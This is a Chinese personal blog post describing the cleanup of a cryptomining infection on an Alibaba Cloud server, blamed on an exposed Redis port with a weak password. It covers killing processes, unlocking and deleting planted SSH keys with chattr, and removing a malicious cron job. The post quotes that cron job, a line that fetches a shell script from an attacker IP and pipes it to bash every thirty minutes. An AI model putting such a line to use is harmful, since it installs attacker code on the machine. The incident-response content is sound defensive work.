解决阿里云服务器上挖矿病毒crypto的实况记录

Bukiyou · 2022-3-19 · 次阅读

起因是收到阿里云的一条短信：

去控制台瞄了一眼，以13号晚为分水岭内存和CPU的使用率上升很多。

经网上百度，中毒的原因似乎是因为开放Redis远程端口+使用了弱密码导致的。

（当初还想着就算端口打开，应该不会有人真的闲得无聊会连接我得云服务器吧。现在：对不起，我错了）

本文主要参考：解决服务器挖矿漏洞crypto_Jkcc的博客-CSDN博客

因为中招的是crypto挖矿病毒，跟该博客类型一样。

一、 htop查看可疑的进程

据说top命令查看不到挖矿病毒的进程

如图所示，感觉那个ddns.pid奇奇怪怪，经网上确认，确实就是前面那两个进程。

根据显示的路径，删除对应的文件夹（var/tmp/.crypto）

  • 注意：先删文件夹，再kill进程。否则进程删除之后还会有病毒文件会启动新进程。

    kill -9 $PID

二、 删除/root/.ssh下的可疑密钥

前两个密钥的修改时间刚好对应了cpu使用异常的时间。

# 删除密钥
[root@iZbp1agkemtu2jqg331chnZ .ssh]# sudo rm -rf authorized_keys
rm: 无法删除'authorized_keys': 不允许的操作

似乎不能直接删除。

有时候你发现用root权限都不能修改某个文件，大部分原因是曾经用chattr命令锁定该文件了。这个命令是用来查看和改变文件、目录属性的，与chmod这个命令相比，chmod只是改变文件的读写、执行权限，更底层的属性控制是由chattr来改变的。

lsattr命令是显示chattr命令设置的文件属性。

# 查看文件属性
[root@iZbp1agkemtu2jqg331chnZ .ssh]# lsattr authorized_keys
----ia-------------- authorized_keys

看到文件有 -i 和 -a 属性

-i： 可以修改文件

-a: 让某个文件只能往里面追加数据，但不能删除

# 修改文件权限
[root@iZbp1agkemtu2jqg331chnZ .ssh]# chattr -a authorized_keys2
-bash: chattr: 未找到命令

chattr一般而言是系统自带的，不过还是试试了一波安装

# 安装chattr
[root@iZbp1agkemtu2jqg331chnZ .ssh]# yum install chattr
Invalid configuration value: failovermethod=priority in /etc/yum.repos.d/CentOS-epel.repo; 配置：ID 为 "failovermethod" 的 OptionBinding 不存在
Repository epel is listed more than once in the configuration
上次元数据过期检查：1:25:30 前，执行于 2022年03月19日 星期六 18时52分28秒。
未找到匹配的参数: chattr
错误：没有任何匹配: chattr

安装失败…去网上又搜索了一波：

参考：chattr: command not found_yaovirus的博客-CSDN博客

可能是chattr被安装挖矿病毒的人删了…

# 查找chattr
[root@iZbp1agkemtu2jqg331chnZ .ssh]# find -name chattr

好的吧，无事发生

还是回到之前的安装chattr的思路吧

搜索了一下，发现好像chattr并非yum安装

参考：阿里云服务器chattr文件被删问题_跛行的博客-CSDN博客

# 查看chattr本该处的目录位置
[root@iZbp1agkemtu2jqg331chnZ .ssh]# which chattr
/usr/bin/which: no chattr in (/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin)

从github上下载chttr.c文件，随便存放在那个位置

因为github好卡，再cdn上存了一份：chttr.c文件下载

# 懒人懒得下载再上传，直接cv代码
[root@iZbp1agkemtu2jqg331chnZ usr]# sudo vi chattr.c
# 编译chattr.c文件
[root@iZbp1agkemtu2jqg331chnZ usr]# cc chattr.c
# 改名a.out文件为chattr
[root@iZbp1agkemtu2jqg331chnZ usr]# mv a.out chattr
# 运行编译好的文件
[root@iZbp1agkemtu2jqg331chnZ usr]# ./chattr
Usage: ./prog_chattr [mode] files

看到Usage那句就算是成功了，再试试看之前的修改权限

# 修改文件权限属性
[root@iZbp1agkemtu2jqg331chnZ .ssh]# chattr -a authorized_keys2
cur attrs: 0x00000030, mask: 0x00000020
new attrs: 0x00000010
[root@iZbp1agkemtu2jqg331chnZ .ssh]# chattr -a authorized_keys
cur attrs: 0x00000030, mask: 0x00000020
new attrs: 0x00000010
[root@iZbp1agkemtu2jqg331chnZ .ssh]# chattr -i authorized_keys 
cur attrs: 0x00000010, mask: 0x00000010
new attrs: 0x00000000
[root@iZbp1agkemtu2jqg331chnZ .ssh]# chattr -i authorized_keys2
cur attrs: 0x00000010, mask: 0x00000010
new attrs: 0x00000000

# 删除密钥
[root@iZbp1agkemtu2jqg331chnZ .ssh]# sudo sudo rm -rf authorized_keys 
[root@iZbp1agkemtu2jqg331chnZ .ssh]# sudo sudo rm -rf authorized_keys2

好耶，这下算是把密钥给删了（挥手告别.jpg）

三、 删除可疑的定时任务

# 查看定时任务列表
[root@iZbp1agkemtu2jqg331chnZ ~]# crontab -l
*/30 * * * * /bin/cdz -fsSL http://104.192.82.138/s3f1015/a/a.sh | bash > /dev/null 2>&1

好家伙，悄咪咪地搜了一波IP好像是美国那边的。

# 编辑删除定时任务
[root@iZbp1agkemtu2jqg331chnZ ~]# crontab -e
/var/spool/cron/#tmp.iZbp1agkemtu2jqg331chnZ.XXXXoVU00i: 不允许的操作
crontab: edits left in /tmp/crontab.Cwvttg

又是不允许修改，和之前的chattr操作差不多

# 查看一下文件属性
[root@iZbp1agkemtu2jqg331chnZ ~]# lsattr /var/spool/cron/root
----ia-------------- /var/spool/cron/root

这还是熟悉的配方：-ia-。那还是同之前一样的操作

[root@iZbp1agkemtu2jqg331chnZ ~]# chattr -i /var/spool/cron/root
cur attrs: 0x00000030, mask: 0x00000010
new attrs: 0x00000020
[root@iZbp1agkemtu2jqg331chnZ ~]# chattr -a /var/spool/cron/root
cur attrs: 0x00000020, mask: 0x00000020
new attrs: 0x00000000

最后一步修改定时任务,删除可疑定时任务

# 查看、删除可疑的定时任务
[root@iZbp1agkemtu2jqg331chnZ ~]# sudo vim /var/spool/cron/root
# 删除按两次d就可以了（dd）
# :wq保存（大家应该都知道吧）

最后又看了一下crontab -l，已经没有东西了。好，战斗告一段落。

四、 修改Redis密码

我也不知道Redis什么时候关了。emm…问题不大。

修改密码的话，只要修改conf文件中的requirepass字段。如果没有的话，自行添加。

至于具体Redis远程配置参考：linux redis 远程访问_懂哥的博客-CSDN博客_linux远程连接redis

五、后话

阿里云服务器被crypto攻击导致CPU爆满(已解决)_大鹏的世界的博客-CSDN博客

看到这一篇文章的时候，发现自己还是太naive了，当初怎么没想到cat一份出来。下载纵然是有危险，但是cat一下查看文内容应该没什么关系。看到文件的内容这才能对病毒删除得更彻底。

关于redis远程植入挖矿病毒的原理介绍：redis远程登录导致挖矿病毒入侵原理及防范 | wekri

似乎挺多云服务器上都出现过挖矿病毒crypto和蠕虫病毒pnscan。不知道可不可以find -name xxx进行排查。

此外，云服务器上的一次异地登陆，个人感觉应该就是因为有密钥所以可以免密登录，如果没有公钥密钥的话，应该无法登录。所以我懒得改密码了

总结：

  1. 不要偷懒用root账号进行一切操作
  2. 需要远程的软件不要用弱密码（123456）
  3. 如果可以的话，安全组限制一下IP来源

CPU之类的都降下来了，先放置一段时间。过段时间再看看有没有问题。（溜

不过本次事宜解决问题为导向，具体了解不够深入，纯小白发言。措辞描述有不当之处还请多多包涵。
